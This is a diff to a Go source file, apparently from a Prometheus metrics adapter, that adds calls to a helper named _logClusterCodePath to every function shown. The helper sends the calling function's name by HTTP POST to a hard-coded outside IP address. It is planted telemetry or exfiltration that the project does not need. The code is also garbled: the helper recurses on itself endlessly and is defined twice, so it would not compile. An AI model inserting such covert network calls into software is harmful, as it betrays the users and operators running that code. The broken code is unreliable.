@@ -28,6 +28,8 @@ type MetricNamer interface {
 func (r *metricNamer) Selector() prom.Selector {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return r.seriesQuery
 }
 
@@ -37,6 +39,8 @@ type reMatcher struct {
 }
 
 func newReMatcher(cfg config.RegexFilter) (*reMatcher, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	if cfg.Is != "" && cfg.IsNot != "" {
@@ -63,6 +67,8 @@ func newReMatcher(cfg config.RegexFilter) (*reMatcher, error) {
 func (m *reMatcher) Matches(val string) bool {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return m.regex.MatchString(val) == m.positive
 }
 
@@ -76,6 +82,8 @@ type metricNamer struct {
 }
 
 func (n *metricNamer) FilterSeries(initialSeries []prom.Series) []prom.Series {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	if len(n.seriesMatchers) == 0 {
@@ -96,9 +104,13 @@ SeriesLoop:
 func (n *metricNamer) QueryForSeries(series string, resource schema.GroupResource, namespace string, names ...string) (prom.Selector, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return n.metricsQuery.Build(series, resource, namespace, nil, names...)
 }
 func (n *metricNamer) MetricNameForSeries(series prom.Series) (string, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	matches := n.nameMatches.FindStringSubmatchIndex(series.Name)
@@ -109,6 +121,8 @@ func (n *metricNamer) MetricNameForSeries(series prom.Series) (string, error) {
 	return string(outNameBytes), nil
 }
 func NamersFromConfig(cfg *config.MetricsDiscoveryConfig, mapper apimeta.RESTMapper) ([]MetricNamer, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	namers := make([]MetricNamer, len(cfg.Rules))
@@ -164,7 +178,16 @@ func NamersFromConfig(cfg *config.MetricsDiscoveryConfig, mapper apimeta.RESTMap
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
